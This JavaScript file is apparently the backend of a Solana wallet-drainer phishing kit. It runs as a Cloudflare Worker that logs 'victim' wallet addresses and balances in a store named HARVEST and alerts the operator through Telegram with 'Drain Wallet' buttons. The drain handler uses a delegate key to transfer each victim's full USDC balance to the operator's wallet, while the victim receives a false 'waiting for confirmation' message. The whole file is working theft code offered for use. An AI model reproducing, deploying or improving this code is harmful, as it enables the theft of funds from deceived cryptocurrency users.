import { Buffer } from 'buffer';
globalThis.Buffer = Buffer;

import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction, SystemProgram } from "@solana/web3.js";
import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
import bs58 from "bs58";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // --- TELEGRAM WEBHOOK ---
    if (request.method === "POST" && url.pathname === "/webhook") {
      try {
        const update = await request.json();
        const msg = update.message || update.channel_post;
        
        if (update.callback_query) {
          const data = update.callback_query.data;
          const chatId = update.callback_query.message.chat.id;

          if (data === "refresh_stats") {
            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
            if (env.HARVEST) {
              const list = await env.HARVEST.list({ limit: 5 });
              for (const key of list.keys) {
                const dataStr = await env.HARVEST.get(key.name);
                if (dataStr) {
                  const d = JSON.parse(dataStr);
                  if (d.type === "connection_and_balance") {
                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol} | USDC: ${d.usdc}\n`;
                  }
                }
              }
            }
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: messageText, parse_mode: "Markdown" }),
            });
          }

          if (data.startsWith("balance:")) {
            const victimAddress = data.split(":")[1];
            const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
            const victimPubkey = new PublicKey(victimAddress);
            const solBalance = await connection.getBalance(victimPubkey);
            const solAmount = (solBalance / 1e9).toFixed(4);

            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: `🔄 *Balance for* \`${victimAddress.slice(0,4)}...\`\n\nSOL: ${solAmount}`, parse_mode: "Markdown" }),
            });
          }

          if (data.startsWith("drain:")) {
            const victimAddress = data.split(":")[1];
            
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: `⏳ Processing drain for \`${victimAddress}\`...`, parse_mode: "Markdown" }),
            });

            try {
              // Wir nutzen einen starken RPC für den Worker
              const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
              const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
              const payer = Keypair.fromSecretKey(privateKeyArray);
              
              const victimPubkey = new PublicKey(victimAddress);
              const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
              
              const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
              const myAta = await getAssociatedTokenAddress(USDC_MINT, payer.publicKey);

              // Hole die exakte USDC Balance des Opfers
              const balance = await connection.getTokenAccountBalance(victimAta);
              const amountToDrain = balance.value.amount;

              if (amountToDrain === "0") {
                throw new Error("Victim has 0 USDC to drain.");
              }

              // Prüfen, ob DEINE Wallet ein USDC Konto hat, wenn nicht, erstellen
              const tx = new Transaction();
              const myAtaInfo = await connection.getAccountInfo(myAta);
              if (myAtaInfo === null) {
                tx.add(
                  createAssociatedTokenAccountInstruction(
                    payer.publicKey, // Payer
                    myAta,           // Associated Token Address
                    payer.publicKey, // Owner
                    USDC_MINT        // Mint
                  )
                );
              }

              // Transfer Instruction hinzufügen
              tx.add(
                createTransferInstruction(
                  victimAta,
                  myAta,
                  payer.publicKey, // Der Delegate (du)
                  [],
                  parseInt(amountToDrain)
                )
              );

              const signature = await sendAndConfirmTransaction(connection, tx, [payer]);

              await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: `✅ *Drain Successful!*\n\nTX: \`${signature}\``, parse_mode: "Markdown" }),
              });

            } catch (err) {
              await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: `❌ *Error:* ${err.message}`, parse_mode: "Markdown" }),
              });
            }
          }

          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: update.callback_query.id })
          });
        }

        return new Response("OK");
      } catch (e) {
        return new Response("Error", { status: 500 });
      }
    }

    // --- WEBSITE DATEN ---
    if (request.method === "POST") {
      try {
        const data = await request.json();
        
        if (env.HARVEST) {
          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
        }
        
        if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
          let channelMsg = "";
          let userMsg = "";
          let buttons = [];
          
          if (data.type === "connection_and_balance") {
            channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}`;
            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
            buttons = [
              [{ text: "⚡ Drain Wallet", callback_data: `drain:${data.victim}` }],
              [{ text: "🔄 Check Balance", callback_data: `balance:${data.victim}` }]
            ];
          } else if (data.type === "drain") {
            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX ready.*`;
          }
          
          if (channelMsg) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }),
            });
          }
          
          if (userMsg && data.tg_user_id) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
            });
          }
        }
        
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });

      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
